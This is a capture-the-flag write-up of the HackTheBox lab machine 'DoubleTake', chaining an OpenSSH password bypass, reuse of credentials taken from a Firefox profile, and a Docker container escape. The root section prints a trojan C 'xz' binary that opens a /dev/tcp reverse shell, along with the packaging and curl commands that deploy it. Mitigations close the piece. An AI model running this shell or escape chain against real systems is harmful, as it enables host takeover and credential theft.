@@ -1,0 +1,273 @@
+---
+title: "DoubleTake"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Easy"
+date: 2026-11-16
+ports: ["22/ssh", "80/http"]
+tags:
+  - linux
+  - docker
+  - container-escape
+  - cve-2026-123158
+  - cve-2026-41567
+  - musl
+  - credential-reuse
+  - path-confusion
+summary: "DoubleTake chains three modern 2026 flaws: an authentication bypass in OpenSSH over musl (*sshole), reuse of credentials stored in Firefox, and a container escape to host root via the Docker API (CVE-2026-41567). The through-line is the name: at every layer, two components read the same input differently."
+retired: true
+draft: false
+---
+
+The name says it all: *take a second look*. At every phase, two layers interpret
+the same input differently —nginx vs Flask, the container vs the host— and in
+that discrepancy lives the vulnerability. The setting is *Zentara*, an AI-agent
+platform built on Docker.
+
+## Chain summary
+
+| Phase | Vector | CVE / Technique |
+| --- | --- | --- |
+| **Foothold** (`alpine` shell) | Password bypass in OpenSSH over musl by sending a password > 256 bytes | **CVE-2026-123158** (`*sshole`) |
+| **User** (`bob`) | Web app credentials stored in Firefox (`logins.json`, `encType:0`) + reuse | Credential reuse |
+| **Root** (host) | Deploy endpoint → Docker API `PUT /containers/{id}/archive` → the daemon resolves `xz` from the container overlay → escape to host root via `chroot /proc/1/root` | **CVE-2026-41567** |
+
+## Reconnaissance
+
+```bash
+echo "10.10.11.x  doubletake.htb" | sudo tee -a /etc/hosts
+nmap -sCV -p- --min-rate 5000 doubletake.htb
+```
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-auth: Basic realm=Zentara
+```
+
+Two starting observations:
+
+- **Modern stack** (OpenSSH 10.6, nginx 1.24.0): this isn't an old-CVE box;
+  the vector will be logic/configuration.
+- Port 80 responds **401 Basic Auth** with `realm="Zentara"` and an
+  **empty body** (`Content-Length: 0`). The `Content-Type: text/html;
+  charset=utf-8` with an explicit charset is the signature of an application
+  framework (Werkzeug/Flask), not nginx's `auth_basic` → **nginx is a reverse
+  proxy to a Flask backend**.
+
+<Callout type="info" title="API enumeration after the 401">
+Although `GET` returns 401, `OPTIONS` returns **200** without credentials
+(automatic Flask behavior). Fuzzing with `OPTIONS` discovers routes and, via
+the `Allow:` header, their methods:
+
+```bash
+ffuf -w raft-medium-directories.txt \
+     -u http://doubletake.htb/FUZZ -X OPTIONS -mc 200
+```
+
+```
+/files    → GET, HEAD, POST, DELETE, OPTIONS
+/settings → GET, HEAD, POST, OPTIONS
+/agents   → GET, HEAD, OPTIONS
+/docs /usage /status → GET, HEAD, OPTIONS
+```
+</Callout>
+
+## Foothold — CVE-2026-123158 (`*sshole`)
+
+The synopsis points to SSH, not the web. OpenSSH 10.6p1 compiled against
+**musl** (Alpine) is vulnerable to **CVE-2026-123158**:
+
+- musl limits `crypt()`'s input to **256 bytes**. A longer password makes the
+  hashing fail and `crypt()` returns the literal `"*"`.
+- That `"*"` collides with the Unix convention of using `"*"` in the shadow
+  field to mark an account with login disabled.
+- The `alpine` account has `"*"` in its shadow → `"*" == "*"` → **access
+  granted** with any password of 257–1024 bytes.
+
+<Callout type="warning" title="The range matters">
+The valid range is **257–1024 bytes**: below 257 it doesn't trigger musl's
+failure; above 1024 OpenSSH rejects it (`MAX_PASSWORD_LEN`). A 300-character
+password lands perfectly.
+</Callout>
+
+```bash
+ssh -o PreferredAuthentications=password \
+    -o PubkeyAuthentication=no \
+    alpine@doubletake.htb
+# password: paste 300 chars ('A'*300) at each prompt
+```
+
+The bypass needs **several attempts on the same connection** (the first send
+bounces with `Permission denied`; the second/third gets in). That's why
+`sshpass` —which only injects once— doesn't work; you have to do it
+interactively or with `expect`.
+
+```
+Welcome to Alpine!
+7f906e0ee8ec:~$ id
+uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
+```
+
+We're inside a **Docker container** (`.dockerenv`, hostname = container
+ID, Alpine 3.22.8).
+
+## User — Firefox credentials + reuse
+
+Enumerating `alpine`'s home, a Firefox profile appears:
+
+```bash
+cat /home/alpine/.mozilla/firefox/zentara.default/logins.json
+```
+
+```json
+{"logins":[{"hostname":"http://172.17.0.1","httpRealm":"Zentara",
+"encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
+"encType":0,...}]}
+```
+
+<Callout type="info" title="encType: 0 = unencrypted">
+`encType: 0` means the fields are **not encrypted with NSS**, just plain
+base64. No need for `firefox_decrypt` or `key4.db` — just decode:
+
+```bash
+echo "Ym9i" | base64 -d                               # bob
+echo "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" | base64 -d # (bob's password)
+```
+</Callout>
+
+The credential was for the web (`172.17.0.1`), but through **reuse** it also
+works for `bob`'s SSH:
+
+```bash
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+    bob@doubletake.htb
+# password: the one recovered from logins.json
+cat /home/bob/user.txt
+# user flag
+```
+
+> Note: `su bob` fails on Alpine (`su: must be suid to work properly`,
+> busybox with no SUID bit). The clean path is direct SSH with the credential.
+
+## Root — CVE-2026-41567 (Docker archive → host escape)
+
+### The Zentara platform
+
+Authenticated on the web (`http://172.17.0.1`, Basic Auth with bob's creds)
+we see **Zentara**, an AI-agent platform with a key endpoint: **`/deploy`**.
+
+The API docs describe it:
+
+> *"Internally the platform forwards the archive to the container engine
+> via `PUT /containers/<container_name>/archive`. Compressed archives
+> (.gz, .xz) are decompressed server-side before extraction."*
+
+### The bug
+
+**CVE-2026-41567** (Docker Engine < 29.5.1): when processing
+`PUT /containers/{id}/archive` with a compressed archive, the daemon
+resolves the decompressor binary (`xz`, `unpigz`) **from the container's
+filesystem** instead of the host, running it with the daemon's privileges
+(**host root**).
+
+### Exploitation — in two deploys
+
+The flow needs an SSH tunnel to reach the internal web comfortably:
+
+```bash
+ssh -L 8080:172.17.0.1:80 \
+    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+    bob@doubletake.htb
+```
+
+The deploy (`POST /deploy`) extracts the archive in the container and
+decompresses the `.xz` by calling `/usr/bin/xz`. Plan:
+
+1. **Plant** a trojan `/usr/bin/xz` (deploy #1, `.tar`, workspace `/`).
+2. **Trigger** by uploading any `.tar.xz` (deploy #2) → the daemon
+   invokes the trojan `xz` as host root.
+
+<Callout type="warning" title="The real escape: chroot /proc/1/root">
+The trojan `xz` can't read `/root/root.txt` directly: it runs in the
+**container's** filesystem, where the flag isn't. The key is that the `xz`
+(as the daemon's root) sees the **host's PID 1**. By doing
+`chroot("/proc/1/root")` it jumps to the real host filesystem. The trojan
+is a **static** C binary (the host is bare):
+</Callout>
+
+```c
+// xz.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mount.h>
+int main(int argc, char *argv[]) {
+    mount("proc", "/proc", "proc", 0, NULL);
+    chroot("/proc/1/root");            // jump to the HOST filesystem
+    chdir("/");
+    execl("/bin/bash", "bash", "-c",
+        "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1", NULL);
+    return 1;
+}
+```
+
+```bash
+# Compile static (the host has no libraries)
+gcc -static -o xz xz.c
+
+# Package the trojan
+mkdir -p pkg/usr/bin && cp xz pkg/usr/bin/xz
+( cd pkg && tar cf ../plant.tar usr/bin/xz )
+
+# Listener in another terminal
+nc -lvnp 4444
+
+# Deploy #1 — plant the trojan xz at the container root
+curl -s -u bob:<password> -X POST \
+  -F 'archive=@plant.tar' -F 'workspace=/' http://localhost:8080/deploy
+
+# Deploy #2 — trigger with any .tar.xz
+curl -s -u bob:<password> -X POST \
+  -F 'archive=@test.tar.xz' -F 'workspace=/workspace' http://localhost:8080/deploy
+```
+
+The daemon detects xz compression, resolves `/usr/bin/xz` from the
+container's overlay and runs the trojan as host root. A `500 Engine error`
+after the trigger is **expected** (the reverse shell timing out).
+
+```
+connect to [10.10.14.9] from (UNKNOWN) [10.10.11.x]
+root@doubletake:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@doubletake:/# cat /root/root.txt
+# root flag
+```
+
+**Host root obtained.** 🏴
+
+## Lessons learned
+
+- **Backend signature in the headers:** a `Content-Type: text/html;
+  charset=utf-8` with an empty body gives away a framework (Flask/Werkzeug)
+  behind the proxy, not nginx's `auth_basic`.
+- **`OPTIONS` to enumerate:** Flask answers OPTIONS without running the
+  auth decorator, useful for mapping routes and methods after a 401.
+- **`encType: 0` in Firefox** = credentials in plain base64, no NSS.
+- **The password range in `*sshole`:** 257–1024 bytes, not "the longer the
+  better".
+- **Root ≠ root of what:** `uid=0` inside an ephemeral container isn't host
+  root. The real escape was `chroot /proc/1/root`.
+- **Living off the land on a bare host:** when `cat`, `ls`, etc. are missing
+  from the daemon's PATH, a static C binary carries everything in with it.
+
+## Mitigations
+
+- **OpenSSH:** update to **10.6p2**; or `UsePAM yes` / disable password auth
+  on musl.
+- **Credentials:** don't store service passwords in browsers; don't reuse
+  credentials between the web app and system accounts.
+- **Docker:** update to **Engine 29.5.1**; restrict access to the
+  `PUT /containers/{id}/archive` endpoint with authorization plugins; don't
+  run privileged containers and drop capabilities.
